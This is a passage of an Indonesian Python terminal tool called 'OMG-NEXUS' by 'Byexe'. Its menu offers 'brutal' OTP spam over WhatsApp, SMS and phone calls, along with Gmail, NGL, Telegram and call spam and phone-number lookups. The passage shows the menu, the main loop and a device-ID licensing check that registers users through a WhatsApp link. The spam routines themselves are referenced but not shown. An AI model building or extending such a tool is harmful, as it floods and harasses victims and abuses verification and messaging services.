╭───────────────── {m}[ {p}INFORMASI DARI BYEXE {m}]{a} ──────────────────╮
│{p} {pesanline1}{jarak_line1} {a}│
│ {p}{pesanline2}{jarak_line2} {a}│
╰─────────────────────────────────────────────────────────────╯

\033[107m{a} {tanggal} | YT: ByexeOfficial | OMG-NEXUS 1.0.0 | ENJOY BRO! {r}
{a}
╭──────────────────────── {m}[ {p}M E N U {m}]{a} ────────────────────────╮
│                                                             {a}│
│ {p}[{h}01{p}] Spam OTP Brutal {m}({p}Whatsapp {h}+{p} Sms {h}+{p} Telepon{m}){r}             {a}│
│ {p}[{h}02{p}] Spam Google Mail Brutal                                {a}│
│ {p}[{h}03{p}] Spam NGL Brutal                                        {a}│
│ {p}[{h}04{p}] Spam BOT Telegram                                      {a}│
│ {p}[{h}05{p}] Spam Telepon                                           {a}│
│ {p}[{h}06{p}] Cek Informasi Nomor Telepon                            {a}│
│ {p}[{h}07{p}] Cek User Premium                                       {a}│
│ {p}[{h}08{p}] Leaderboard Keaktifan Hari Ini {m}|{h} Closed                {a}│
│ {p}[{h}09{p}] Set Informasi Banner                                   {a}│
│ {p}[{h}10{p}] Join Channel WhatsApp Byexe                            {a}│
│ {p}[{h}11{p}] Lapor Bug{m}/{p}Masalah {m}|{p} Hubungi {h}Byexe                      {a}│
│ {p}[{h}00{p}] Keluar                                                 {a}│
│                                                             {a}│
╰── ╭─ {m}[{p} P I L I H {m}]{a} ─────────────────────────────────────────╯""")

def menu_utama():
    menu_pertama = {
        '1': spam_otp_main,
        '2': gmail_spam_main,
        '3': ngl_spam_main,
        '4': tg_main,
        '5': spam_telp_main,
        '6': nosint_run,
        '7': cuser_main,
        '8': leaderboardtutup,
        '9': set_pesan_main,
        '10': channelwa,
        '11': chatme
      }

    try:
        while True:
            tampilkan_menu()
            try:
                pilihan = input(f"{a}    ╰──{h}➤{p} ").strip()
                if pilihan == '0':
                    hapus_sesi()
                    clear()
                    sys.exit(0)
                elif pilihan in menu_pertama:
                    menu_pertama[pilihan]()
                else:
                    input(f"\n {p}[{m}!{p}] Pilihan tidak valid{m} | {h}ENTER{r}")
            except (EOFError, KeyboardInterrupt):
                continue
    except KeyboardInterrupt:
        hapus_sesi()
        clear()
        sys.exit(0)


def main_menu1():
    global deviceid, nama, tanggal, ipaddress, merekhp, os_hp, cpu, memory

    setup_kontol_sinyals()

    try:
        if cek_sesi():
            clear()
            print(f"""{a}
╭───────────────────────────────────────────────────────────╮
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                      {a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠀⠀⢀⡆⠀⠀⢠⣷⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠀⢠⣾⠀⠀⠀⢸⣿⠀⠀⠀⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠠⢿⡿⠀⠀⠀⢸⣿⠀⠀⠀⢸⣿⢦⡀⠀⠀  {h}┌┐┌┌─┐─┐ ┬┬ ┬┌─┐       {h}┌─┐┌─┐┌─┐⠀⠀⠀ {a}│
│\033[1;35m  ⠀⠀⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⡄⠀⠀⠀  {h}│││├┤ ┌┴┬┘│ │└─┐  {m}───  {h}└─┐├┤ │      {a}│
│\033[1;35m  ⠀⠀⢰⣿⠁⠀⠀⠀⣿⣿⡇⠀⠀⠀⢹⣷⠀⠀⠀  {h}┘└┘└─┘┴ └─└─┘└─┘       {h}└─┘└─┘└─┘    {a}│
│\033[1;35m  ⠀⢀⣿⡟⠀⠀⠀⢀⣿⣿⣟⠀⠀⠀⢸⣿⡇⠀⠀ {a}──────────────────────────────────   {a}│
│\033[1;35m  ⠀⢸⣿⡇⠀⣀⡤⢸⣿⣿⣿⢠⣄⡀⠈⣿⣧⠀⠀⠀⠀                                    {a}│
│\033[1;35m   ⣾⣿⣿⣿⣿⡇⢸⣿⣿⣿⠘⣿⣿⣿⣿⣿⡇⠀ ⠀ {a}╭───────── {m}[{p} 安全 {m}]{a} ─────────╮     {a}│
│\033[1;35m  ⣸⣿⣿⣿⣿⡿⠇⣿⣿⣿⣿⡇⠿⣿⣿⣿⣿⣿⠀⠀ ⠀{a}│ {p}Kejanggalan Terdeteksi⠀⠀   {a}│     {a}│
│\033[1;35m  ⠿⠟⠛⠉⠀⠀⠀⠘⣿⣿⡿⠀⠀⠀⠉⠙⠛⠿⠇⠀⠀ {a}│ {p}Harap Matikan Hal Yang     {a}│     {a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│ {p}Dapat Mengganggu Script! ⠀⠀{a}│     {a}│
│\033[1;35m ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}╰────────────────────────────╯     {a}│
╰───────────────────────────────────────────────────────────╯
""")
            sys.exit(0)

        deviceid = get_devid()
        clear()

        o = "\033[1;33m"
        DEVICE_ID = deviceid
        status, user_data = cek_devid(deviceid)

        if status is None:
            os.system("clear")
            print(f"""{p}
╭──────────────────────────────────╮
│  {h}  ╔═╗{o}┬ ┬┌─┐┌─┐┬┌─      {o} ┬┌┬┐    {p}│
{p}│  {h}  ║  {o}├─┤├┤ │  ├┴┐ {m} ───{o}  │ ││   {p} │
{p}│  {h}  ╚═╝{o}┴ ┴└─┘└─┘┴ ┴      {o} ┴─┴┘    {p}│
{p}╰──────────────────────────────────╯
{p}  [{h}#{p}]{p} ID{m} :{h} {DEVICE_ID}
{r}  {p}[{h}*{p}]{p} Status {m}: {h}Gagal Terhubung Ke Database. Coba Lagi Nanti""")
            sys.exit(0)

        elif not status:
            os.system("clear")
            print(f"""
{a}╭──────────────────────────────────╮
{a}│{m}╔═╗{p}┬─┐┌─┐┌─┐┌┬┐┌─┐    {m}╔╗╔{p}┌─┐┌┬┐┌─┐{a}│
{a}│{m}║  {p}├┬┘├┤ ├─┤ │ ├┤     {m}║║║{p}├─┤│││├┤ {a}│
{a}│{m}╚═╝{p}┴└─└─┘┴ ┴ ┴ └─┘    {m}╝╚╝{p}┴ ┴┴ ┴└─┘{a}│
{a}╰──────────────────────────────────╯""")
            c_namabaru = input(f"  {p}[{h}?{p}] Buat Username Baru Kamu {m}:{p} ")
            os.system("clear")
            time.sleep(1)
            print(f"""{p}
╭──────────────────────────────────╮
│  {h}  ╔═╗{o}┬ ┬┌─┐┌─┐┬┌─      {o} ┬┌┬┐    {p}│
{p}│  {h}  ║  {o}├─┤├┤ │  ├┴┐ {m} ───{o}  │ ││   {p} │
{p}│  {h}  ╚═╝{o}┴ ┴└─┘└─┘┴ ┴      {o} ┴─┴┘    {p}│
{p}╰──────────────────────────────────╯
{p}  [{h}#{p}]{p} ID{m} :{h} {DEVICE_ID}
{r}  {p}[{h}*{p}]{p} Status {m}: {h}ID Tidak Ditemukan Dalam Database """)
            os.system(f"xdg-open 'https://api.whatsapp.com/send?phone=6285691909415&text=python+dbotp.py+-add+{DEVICE_ID}+{c_namabaru}'")
            sys.exit(0)

        nama = user_data.get("nama", "Unknown")
        tanggal = user_data.get("tanggal_daftar", "N/A")
        ipaddress = get_ip()
        buat_sesi()
        clear()
        menu_utama()

    except KeyboardInterrupt:
        hapus_sesi()
        clear()
        sys.exit(0)
    except Exception as e:
        hapus_sesi()
        print(f"\n {p}[{m}!{p}] Error{m}:{a} {e}")
        sys.exit(1)
        
if __name__ == "__main__":
    try:
        os.system("clear")
        print(f"{h}⌗ {p}Script Sedang Dijalanlan{m},{p} Tunggu 10{m}-{p}15 Detik")
        main_menu1()
    except KeyboardInterrupt:
        hapus_sesi()
        clear()
        sys.exit(0)
    except Exception as e:
        hapus_sesi()
        sys.exit(1)
